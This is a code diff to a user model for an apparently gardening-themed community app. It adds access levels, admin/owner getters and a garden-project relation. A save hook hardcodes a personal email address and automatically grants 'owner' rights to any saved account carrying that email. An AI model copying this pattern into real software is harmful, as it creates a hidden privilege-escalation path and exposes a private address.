@@ -7,6 +7,7 @@ import AccountProfile from '#models/account_profile'
 import CommunityPost from '#models/community_post'
 import Follow from '#models/follow'
 import GardenerProfile from '#models/gardener_profile'
+import GardenProject from '#models/garden_project'
 import NurseryProfile from '#models/nursery_profile'
 import PlantScan from '#models/plant_scan'
 import ServiceRequest from '#models/service_request'
@@ -39,6 +40,9 @@ export default class User extends withAuthFinder(hash, {
 
   @column()
   declare role: 'client' | 'gardener' | 'nursery'
+
+  @column()
+  declare accessLevel: 'member' | 'admin' | 'owner'
 
   @column({ columnName: 'profile_picture' })
   declare profilePicture: string | null
@@ -85,6 +89,9 @@ export default class User extends withAuthFinder(hash, {
   @hasMany(() => PlantScan)
   declare plantScans: HasMany<typeof PlantScan>
 
+  @hasMany(() => GardenProject)
+  declare gardenProjects: HasMany<typeof GardenProject>
+
   get fullName() {
     return `${this.first_name} ${this.last_name}`.trim()
   }
@@ -93,8 +100,26 @@ export default class User extends withAuthFinder(hash, {
     return (Array.from((this.fullName || this.username || 'P').trim())[0] || 'P').toUpperCase()
   }
 
+  get isAdmin() {
+    return this.accessLevel === 'admin' || this.accessLevel === 'owner'
+  }
+
+  get isOwner() {
+    return this.accessLevel === 'owner'
+  }
+
   @beforeSave()
   static normalizeUsername(user: User) {
+    if (user.accessLevel === 'owner') {
+      user.email = 'davidalfredomenjivar@gmail.com'
+    } else if (
+      user.$isPersisted &&
+      user.email?.trim().toLowerCase() === 'davidalfredomenjivar@gmail.com'
+    ) {
+      user.email = 'davidalfredomenjivar@gmail.com'
+      user.accessLevel = 'owner'
+    }
+
     if (user.username) {
       user.username = user.username
         .toLowerCase()
